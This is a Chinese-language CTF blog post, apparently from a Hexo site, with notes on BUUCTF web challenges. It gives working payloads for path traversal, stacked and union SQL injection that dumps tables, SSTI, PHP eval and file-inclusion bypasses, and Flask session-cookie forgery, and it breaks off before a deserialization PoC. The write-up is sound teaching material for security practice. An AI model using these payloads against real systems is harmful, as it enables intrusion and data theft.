@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="WEB,CTF," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Mugen" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言刷题做个笔记来 [HCTF 2018]WarmUp这是一道代码审计题目 将?二次url编码获取flag 1http://XXXXX/source.php?file=source.php%253f../../../../../ffffllllaaaagggg [强网杯 2019]随便注先测试是盲注 11&amp;apos; and 1=1 #     1&amp;apos; and 1=2 # 然后 11&amp;ap">
+<meta name="keywords" content="WEB,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF刷题笔记">
+<meta property="og:url" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/index.html">
+<meta property="og:site_name" content="Mugen">
+<meta property="og:description" content="前言刷题做个笔记来 [HCTF 2018]WarmUp这是一道代码审计题目 将?二次url编码获取flag 1http://XXXXX/source.php?file=source.php%253f../../../../../ffffllllaaaagggg [强网杯 2019]随便注先测试是盲注 11&amp;apos; and 1=1 #     1&amp;apos; and 1=2 # 然后 11&amp;ap">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200709134218820.png">
+<meta property="og:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200709202139884.png">
+<meta property="og:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200711065127602.png">
+<meta property="og:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200712074227998.png">
+<meta property="og:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200712075657809.png">
+<meta property="og:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200717135753819.png">
+<meta property="og:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200720111907377.png">
+<meta property="og:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200720142225713.png">
+<meta property="og:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200720144618205.png">
+<meta property="og:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200720163553250.png">
+<meta property="og:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200721105639085.png">
+<meta property="og:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200728141249042.png">
+<meta property="og:updated_time" content="2020-09-08T07:43:05.800Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BUUCTF刷题笔记">
+<meta name="twitter:description" content="前言刷题做个笔记来 [HCTF 2018]WarmUp这是一道代码审计题目 将?二次url编码获取flag 1http://XXXXX/source.php?file=source.php%253f../../../../../ffffllllaaaagggg [强网杯 2019]随便注先测试是盲注 11&amp;apos; and 1=1 #     1&amp;apos; and 1=2 # 然后 11&amp;ap">
+<meta name="twitter:image" content="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/Users/lego/AppData/Roaming/Typora/typora-user-images/image-20200709134218820.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/"/>
+
+
+
+
+
+  <title>BUUCTF刷题笔记 | Mugen</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mugen</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">lego's blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
+            
+            朋友
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://legoc.github.io/2020/07/09/BUUCTF刷题笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lego">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/legoc/legoc.github.io/master/about/index/baye.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mugen">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BUUCTF刷题笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-09T13:10:19+08:00">
+                2020-07-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读次数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刷题做个笔记来</p>
+<h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>这是一道代码审计题目</p>
+<p>将?二次url编码获取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://XXXXX/source.php?file=source.php%253f../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>先测试是盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=1 #     1&apos; and 1=2 #</span><br></pre></td></tr></table></figure>
+<p>然后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;  order by 1,2,3 #</span><br></pre></td></tr></table></figure>
+<p>发现报错，说明是两列</p>
+<p>尝试联合注入，提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+<p>尝试堆叠注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; ;show tables#</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200709134218820.png" alt="image-20200709134218820"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; ;show columns from `1919810931114514`#</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200709202139884.png" alt="image-20200709202139884"></p>
+<p>可以用mysql 预定义语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&apos; ;select flag from `1919810931114514`#</span><br><span class="line">对于hex编码为</span><br><span class="line">0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460</span><br><span class="line">最终payload</span><br><span class="line">1;Set @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;Prepare exesql from @a;execute execsql;#</span><br></pre></td></tr></table></figure>
+<p>还有一种方法就是改表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;rename tables `words` to `test`;rename tables `1919810931114514` to `words`;</span><br><span class="line">alter table `words` change `flag` `id` varchar(100);#</span><br></pre></td></tr></table></figure>
+<p>然后在1’ or 1=1#</p>
+<p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200711065127602.png" alt="image-20200711065127602"></p>
+<h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>这题的原语句是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_POST[query] || flag from flag</span><br></pre></td></tr></table></figure>
+<p>这题以前做的时候知道有非预期解，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>
+<p>在数据库里面就是这样的</p>
+<p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200712074227998.png" alt="image-20200712074227998"></p>
+<p>预期解法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set sql_mode=pipes_as_concat</span><br></pre></td></tr></table></figure>
+<p>用这个语句把<code>||</code>变成连接符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode=pipes_as_concat;select 1</span><br></pre></td></tr></table></figure>
+<p>然后再select 1的时候就会查到数据了</p>
+<p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200712075657809.png" alt="image-20200712075657809"></p>
+<h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>这个是一个登入框，万能密码可以得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or 1=1#  (url里面注意把#编码成%23)</span><br></pre></td></tr></table></figure>
+<h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>ssti模板注入msg参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; handler.settings &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>访问flag.txt提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fllllllllllllag</span><br></pre></td></tr></table></figure>
+<p>hint为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+<p>得到cookie_secret为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">82624e38-0ada-4948-aefc-9ea3a910a465</span><br></pre></td></tr></table></figure>
+<p>即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">82624e38-0ada-4948-aefc-9ea3a910a465</span><br><span class="line">3bf9f6cf685a6dd8defadabfb41a03a1   (/fllllllllllllag的md5)   </span><br><span class="line">拼接再做md5</span><br><span class="line">daac3c98830006add152414c80e87f3d</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>查看源码</p>
+<p>发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	$cat=$_GET[&apos;cat&apos;];</span><br><span class="line">	echo $cat;</span><br><span class="line">	if($cat==&apos;dog&apos;)&#123;</span><br><span class="line">		echo &apos;Syc&#123;cat_cat_cat_cat&#125;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>输入?cat=dog得到flag</p>
+<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>查看源码发现了calc.php源码</p>
+<p>然后访问得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&apos;num&apos;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&apos;num&apos;];</span><br><span class="line">        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&apos;echo &apos;.$str.&apos;;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>preg_match是一个危险函数，可以引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。（暂时这样理解，因为只看到了/e匹配模式的，不确定/m的是否也是这个样子)</p>
+<p>调用scandir去查看当前路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
+<p>发现f1agg文件</p>
+<ul>
+<li>scandir() 函数返回指定目录中的文件和目录的数组</li>
+</ul>
+<p>最终payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
+<p>即读取/f1agg</p>
+<p>得到flag</p>
+<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>在跳转页面抓包发现提示secr3t.php</p>
+<p>访问得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&apos;file&apos;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>直接读取发现读不出来，用php伪协议读就好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>change页面发现了源码地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span><br></pre></td></tr></table></figure>
+<p>看源码发现是用admin登入就可以拿到flag了</p>
+<ul>
+<li><h4 id="flask-sessions伪造"><a href="#flask-sessions伪造" class="headerlink" title="flask sessions伪造"></a>flask sessions伪造</h4></li>
+</ul>
+<p>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。</p>
+<p>首先下一个flask工具</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/noraj/flask-session-cookie-manager</span><br></pre></td></tr></table></figure>
+<p>SECRET_KEY的值查看源码发现是<code>ckj123</code>，先解码sessions发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager2.py decode -c &quot;.eJw9XXX&quot; -s &quot;ckj123&quot;</span><br></pre></td></tr></table></figure>
+<p>返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;u&apos;csrf_token&apos;: &apos;e6f667b5f1885ab171fc6ede1b850a0a8ce017af&apos;, u&apos;_fresh&apos;: True, u&apos;user_id&apos;: u&apos;10&apos;, u&apos;name&apos;: u&apos;lego&apos;, u&apos;_id&apos;: &apos;8ac709d0c4ac7bcbf41b5999f303cca0f143f85baff7e24a2aab42f65ad19e1c0cc31b2ad9928b50175aaed34e44e66e225ce828445f5857cb08d1241aca95fe&apos;&#125;</span><br></pre></td></tr></table></figure>
+<p>把name改成admin再编码一下接可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager2.py encode -s &quot;ckj123&quot; -t &quot;&#123;xxxxx&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>然后替换cookie里面的session就可以拿到flag了</p>
+<ul>
+<li><h4 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h4></li>
+</ul>
+<p>nodeprep.prepare函数用的twisted版本是10.2.0的官网最新的是19.2.0，存在一个漏洞，</p>
+<p>这里原理就是利用nodeprep.prepare函数会将unicode字符<code>ᴬ</code>转换成<code>A</code>，而<code>A</code>在调用一次nodeprep.prepare函数会把<code>A</code>转换成<code>a</code>。</p>
+<p>所以注册1一个用户名为<code>ᴬdmin</code>的用户，然后重置密码再登入就可以以admin的身份登入得到flag。</p>
+<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>万能密码发现有注入，order by 确定字段为3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=ad1in&apos; union select 1,2,3%23&amp;password=admin</span><br></pre></td></tr></table></figure>
+<p>发现有回显</p>
+<p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200717135753819.png" alt="image-20200717135753819"></p>
+<p>报数据库名为<code>geek</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=ad1in&apos; union select 1,database(),3%23&amp;password=admin</span><br></pre></td></tr></table></figure>
+<p>爆表名geekuser,l0ve1ysq1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=ad1in&apos; union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=admin</span><br></pre></td></tr></table></figure>
+<p>爆列名id,username,password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=ad1in&apos; union select 1,1,group_concat(column_name) from information_schema.columns where table_name=&apos;l0ve1ysq1&apos;%23&amp;password=admin</span><br></pre></td></tr></table></figure>
+<p>爆字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=ad1in&apos; union select 1,1,group_concat(password) from l0ve1ysq1 %23&amp;password=admin</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag&#123;84424bf6-f114-4a4d-ad7a-1b4b6c3df86c&#125;&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>打开提示说有备份，访问<a href="http://www.zip下载文件" target="_blank" rel="noopener">www.zip下载文件</a></p>
+<p>关键是反序列化部分代码，查看代码得知</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function __wakeup()&#123;</span><br><span class="line">    $this-&gt;username = &apos;guest&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __destruct()&#123;</span><br><span class="line">    if ($this-&gt;password != 100) &#123;</span><br><span class="line">        echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">        echo &quot;You name is: &quot;;</span><br><span class="line">        echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">        echo &quot;You password is: &quot;;</span><br><span class="line">        echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    if ($this-&gt;username === &apos;admin&apos;) &#123;</span><br><span class="line">        global $flag;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&apos;t give you the flag!&quot;;</span><br><span class="line">        die();</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要两个条件账户admin密码100，在class.php下加上以下POC</p>
